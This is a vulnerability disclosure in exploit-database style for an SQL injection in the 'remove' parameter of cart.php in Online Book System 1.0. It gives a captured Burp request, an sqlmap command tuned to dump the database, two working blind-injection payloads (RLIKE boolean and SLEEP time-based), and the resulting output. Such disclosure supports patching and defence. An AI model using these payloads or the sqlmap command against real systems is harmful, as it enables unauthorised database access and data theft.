# Online Book System- SQL Injection - 6
+ **Exploit Title:** Online Book System- SQL Injection
+ **Date:** 2024-26-03
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://code-projects.org/online-book-system-in-php-css-js-and-mysql-free-download/
+ **Software Link:** https://download.code-projects.org/details/74c24d93-431e-4e31-acc1-802f14caef5c
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
Online Book System 1.0 allows SQL Injection via the 'remove' parameter at "/BookStore-master%201/cart.php?remove=ENT-1". 
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "localhost/BookStore-master 1/index.php"
+ Then select a book and press buy
+ Then click remove-buton
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:

```
GET /BookStore-master%201/cart.php?remove=ENT-1 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
```

+ Use sqlmap to exploit. In sqlmap, use 'remove' parameter to dump the database.
```
sqlmap -r r.txt -p remove --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: remove (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: remove=ENT-1' RLIKE (SELECT (CASE WHEN (7446=7446) THEN 0x454e542d31 ELSE 0x28 END))-- qerH

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: remove=ENT-1' AND (SELECT 3554 FROM (SELECT(SLEEP(5)))driG)-- ENsN
---
[11:38:57] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[11:38:57] [INFO] fetching current database
[11:38:57] [INFO] retrieving the length of query output
[11:38:57] [INFO] resumed: 16
[11:38:57] [INFO] resumed: u385439067_store
current database: 'u385439067_store'

```
+ current database: `u385439067_store`

![Ekran görüntüsü 2024-03-26 183944](https://github.com/BurakSevben/CVEs/assets/117217689/4d7a5746-af63-4898-a947-c8a74af95d20)
